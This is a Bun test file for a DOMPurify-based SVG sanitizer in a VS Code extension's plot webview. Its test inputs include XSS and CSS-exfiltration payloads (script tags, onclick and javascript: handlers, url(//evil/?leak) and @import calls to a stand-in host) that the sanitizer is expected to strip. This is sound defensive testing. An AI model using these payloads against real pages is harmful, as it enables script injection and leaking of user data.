// DOMPurify in Node/Bun needs a DOM to operate on. We borrow jsdom from
// editors/vscode/node_modules via the tracked symlink at
// tests/bun/node_modules → ../../editors/vscode/node_modules, then
// stuff its `window` into globalThis BEFORE importing sanitize.ts so
// the `import DOMPurify from 'dompurify'` in sanitize.ts picks up the
// fake `window` it needs.
import { describe, test, expect, beforeAll } from 'bun:test';
import { JSDOM } from 'jsdom';

beforeAll(() => {
    // Provide a DOM globally so DOMPurify's auto-detection works.
    // DOMPurify uses `window.document.implementation.createHTMLDocument`
    // internally; jsdom gives us all of those for free.
    const dom = new JSDOM('<!doctype html><html><body></body></html>');
    const g = globalThis as Record<string, unknown>;
    g.window = dom.window;
    g.document = dom.window.document;
    g.Node = dom.window.Node;
    g.NodeFilter = dom.window.NodeFilter;
    g.HTMLElement = dom.window.HTMLElement;
    g.SVGElement = dom.window.SVGElement;
    g.DocumentFragment = dom.window.DocumentFragment;
    g.trustedTypes = (dom.window as unknown as { trustedTypes?: unknown }).trustedTypes;
});

// Dynamic import so the beforeAll runs first.
const sanitize_svg: (text: string) => string = await (async () => {
    const mod = await import('../../editors/vscode/src/plot/webview/sanitize');
    return mod.sanitize_svg;
})();

describe('sanitize_svg — benign content passes through', () => {
    test('basic httpgd-style SVG survives', () => {
        const input = '<svg class="httpgd" viewBox="0 0 480 360" xmlns="http://www.w3.org/2000/svg">'
            + '<rect width="100%" height="100%" fill="#ffffff" />'
            + '<text x="10" y="20" fill="#000000">label</text>'
            + '</svg>';
        const out = sanitize_svg(input);
        expect(out).toContain('<svg');
        expect(out).toContain('<rect');
        expect(out).toContain('<text');
        // Body content survives.
        expect(out).toContain('label');
    });

    test('class="httpgd" is preserved (load-bearing for the CSS overlay selector)', () => {
        const input = '<svg class="httpgd" xmlns="http://www.w3.org/2000/svg"><rect /></svg>';
        const out = sanitize_svg(input);
        // Parse the output and verify the root <svg> retains class="httpgd".
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const svg = dom.window.document.querySelector('svg');
        expect(svg).not.toBeNull();
        expect(svg!.classList.contains('httpgd')).toBe(true);
    });

    test('viewBox is preserved', () => {
        const input = '<svg class="httpgd" viewBox="0 0 480 360" xmlns="http://www.w3.org/2000/svg"><rect /></svg>';
        const out = sanitize_svg(input);
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const svg = dom.window.document.querySelector('svg');
        expect(svg!.getAttribute('viewBox')).toBe('0 0 480 360');
    });

    test('inline fill / stroke attributes survive', () => {
        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<rect fill="#ffffff" stroke="#000000" />'
            + '</svg>';
        const out = sanitize_svg(input);
        expect(out).toContain('fill="#ffffff"');
        expect(out).toContain('stroke="#000000"');
    });
});

describe('sanitize_svg — malicious content is stripped', () => {
    test('<script> is stripped', () => {
        const input = '<svg><script>alert(1)</script><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<script');
        expect(out).not.toContain('alert(1)');
    });

    test('event handler attributes are stripped (e.g. onclick)', () => {
        const input = '<svg><rect onclick="alert(1)" /></svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('onclick');
        expect(out).not.toContain('alert(1)');
    });

    test('inline style="" attribute is stripped (FORBID_ATTR)', () => {
        // The load-bearing defense behind `style-src \'unsafe-inline\'`:
        // a malicious inline style could exfiltrate via
        // `background:url(//evil/?cookie)`.
        const input = '<svg><rect style="background:url(//evil/?leak)" /></svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('style=');
        expect(out).not.toContain('evil');
    });

    test('<a xlink:href="javascript:..."> is stripped (FORBID_TAGS: a)', () => {
        const input = '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<a');
        expect(out.toLowerCase()).not.toContain('javascript:');
        // The inner <text> may or may not survive (DOMPurify hoists
        // children when a parent is forbidden), but the <a> wrapper
        // and any javascript: URL MUST be gone.
    });

    test('<use href="//evil/track"> is stripped (FORBID_TAGS: use)', () => {
        const input = '<svg><use href="//evil/track" /><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<use');
        expect(out).not.toContain('evil');
    });

    test('<image href="//evil/track"> is stripped (FORBID_TAGS: image)', () => {
        const input = '<svg><image href="//evil/track" /><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<image');
        expect(out).not.toContain('evil');
    });

    test('<style>@import url(//evil)</style> is stripped (FORBID_TAGS: style)', () => {
        // Sister channel to inline `style=` attribute exfil.
        const input = '<svg><style>@import url(//evil/?leak)</style><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out).not.toContain('<style');
        expect(out).not.toContain('@import');
        expect(out).not.toContain('evil');
    });

    test('<foreignObject> is stripped (FORBID_TAGS: foreignObject)', () => {
        const input = '<svg><foreignObject><div onclick="alert(1)">html</div></foreignObject><rect /></svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('foreignobject');
        // Inner HTML should also be sanitized (no onclick).
        expect(out.toLowerCase()).not.toContain('onclick');
    });

    test('<feImage> in filters is stripped (FORBID_TAGS: feImage)', () => {
        const input = '<svg><filter><feImage href="//evil/track" /></filter><rect /></svg>';
        const out = sanitize_svg(input);
        // DOMPurify lowercases element names. Check for both shapes.
        expect(out.toLowerCase()).not.toContain('feimage');
        expect(out).not.toContain('evil');
    });
});

describe('sanitize_svg — httpgd inline style preservation', () => {
    // httpgd emits colors via inline `style="fill: ...; stroke: ..."`,
    // NOT via fill=/stroke= attributes. Earlier sanitize.ts stripped
    // the style attribute wholesale, leaving the rendered SVG painted
    // with the SVG default values (fill=black, stroke=none) — which on
    // a dark VS Code editor background is invisible. The "Apply VS Code
    // theme" overlay was hiding this regression: with the overlay ON,
    // CSS supplied `--vscode-editor-foreground` via `!important`, so
    // strokes and text were visible only with the toggle on.
    //
    // These tests pin the fix: inline style declarations from httpgd
    // (presentation properties only — fill, stroke, font, etc.) must
    // be migrated to proper SVG attributes BEFORE DOMPurify's
    // FORBID_ATTR strips `style=`.
    test('inline style fill/stroke survive sanitize as attributes', () => {
        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<circle cx="10" cy="10" r="5" style="stroke: #000000; fill: #FF0000;" />'
            + '</svg>';
        const out = sanitize_svg(input);
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const circle = dom.window.document.querySelector('circle');
        expect(circle).not.toBeNull();
        expect(circle!.getAttribute('fill')).toBe('#FF0000');
        expect(circle!.getAttribute('stroke')).toBe('#000000');
        // The raw `style=` attribute itself MUST be gone — preserves
        // the defense-in-depth against CSS-`url()` exfiltration.
        expect(circle!.getAttribute('style')).toBeNull();
    });

    test('a comprehensive httpgd-shaped style is migrated property by property', () => {
        // Mirror the actual httpgd output shape: text gets font-size,
        // fill, font-family; rects/circles get stroke, stroke-width,
        // fill. Single-quoted attribute with embedded double-quoted
        // value (font-family: "Arial") mirrors the real fixture.
        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<rect width="100%" height="100%" style="stroke: none; fill: #FFFFFF;" />'
            + "<text x='10' y='20' style='font-size: 9.13px; fill: #4D4D4D; font-family: \"Arial\";'>label</text>"
            + '</svg>';
        const out = sanitize_svg(input);
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const rect = dom.window.document.querySelector('rect');
        const text = dom.window.document.querySelector('text');
        expect(rect!.getAttribute('fill')).toBe('#FFFFFF');
        expect(rect!.getAttribute('stroke')).toBe('none');
        expect(text!.getAttribute('fill')).toBe('#4D4D4D');
        expect(text!.getAttribute('font-size')).toBe('9.13px');
        // Font-family value retains its CSS-style quotes — SVG accepts
        // them; this preserves the family name fidelity httpgd emits.
        expect(text!.getAttribute('font-family')).toBe('"Arial"');
    });

    test('httpgd fixture renders with visible paint after sanitization', async () => {
        // End-to-end against the checked-in fixture: every <circle>
        // in the plot data has either a fill or a stroke that is NOT
        // the SVG default ("none"/black), so the plot is visible in
        // any theme — proving the toggle-off rendering path works.
        const { readFileSync } = await import('node:fs');
        const { resolve } = await import('node:path');
        const fixturePath = resolve(
            // import.meta.dir at runtime is the directory of this test
            // file, so `..` reaches the repo's tests/ directory.
            (import.meta as unknown as { dir: string }).dir,
            '..',
            'fixtures',
            'httpgd',
            'plot-1-10.svg',
        );
        const fixture = readFileSync(fixturePath, 'utf-8');
        const out = sanitize_svg(fixture);
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const firstRect = dom.window.document.querySelector('svg > rect');
        expect(firstRect).not.toBeNull();
        // The canvas-rect's fill is httpgd's bg parameter (#FFFFFF) —
        // load-bearing for toggle-OFF rendering (white background).
        expect(firstRect!.getAttribute('fill')).toBe('#FFFFFF');
        const circles = dom.window.document.querySelectorAll('circle');
        expect(circles.length).toBeGreaterThan(0);
        for (const c of circles) {
            const stroke = c.getAttribute('stroke');
            const fill = c.getAttribute('fill');
            const hasVisiblePaint =
                (stroke !== null && stroke !== '' && stroke !== 'none')
                || (fill !== null && fill !== '' && fill !== 'none');
            expect(hasVisiblePaint).toBe(true);
        }
    });

    test('inline style with url(...) is dropped, safe declarations preserved', () => {
        // CSS exfiltration defense: a malicious R user emitting
        // `style="fill: #fff; background: url(//evil/?leak)"` must NOT
        // produce a `url(` token anywhere in the sanitized output.
        // The safe `fill` declaration is preserved as `fill="#fff"`.
        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<rect style="fill: #ffffff; background: url(//evil/?leak);" />'
            + '</svg>';
        const out = sanitize_svg(input);
        expect(out.toLowerCase()).not.toContain('url(');
        expect(out).not.toContain('evil');
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const rect = dom.window.document.querySelector('rect');
        expect(rect!.getAttribute('fill')).toBe('#ffffff');
        expect(rect!.getAttribute('style')).toBeNull();
    });

    test('unrecognized style properties are dropped, not migrated', () => {
        // `background` is not an SVG presentation attribute and isn't
        // in the safe-property allowlist; it must not survive as a
        // background= attribute (which is meaningless) or a style=.
        const input = '<svg xmlns="http://www.w3.org/2000/svg">'
            + '<rect style="fill: #fff; background-color: red;" />'
            + '</svg>';
        const out = sanitize_svg(input);
        const dom = new JSDOM(`<!doctype html><html><body>${out}</body></html>`);
        const rect = dom.window.document.querySelector('rect');
        expect(rect!.getAttribute('fill')).toBe('#fff');
        expect(rect!.getAttribute('background-color')).toBeNull();
        expect(rect!.getAttribute('style')).toBeNull();
    });
});

describe('sanitize_svg — robustness', () => {
    test('empty input → empty output', () => {
        expect(sanitize_svg('')).toBe('');
    });

    test('malformed input does not throw', () => {
        expect(() => sanitize_svg('<svg><rect <<<malformed')).not.toThrow();
        expect(() => sanitize_svg('<<<')).not.toThrow();
        expect(() => sanitize_svg('not html at all')).not.toThrow();
    });

    test('purely textual input is returned as-is (or as empty)', () => {
        const out = sanitize_svg('hello world');
        // DOMPurify may return the text as-is for non-tag content.
        expect(typeof out).toBe('string');
    });
});
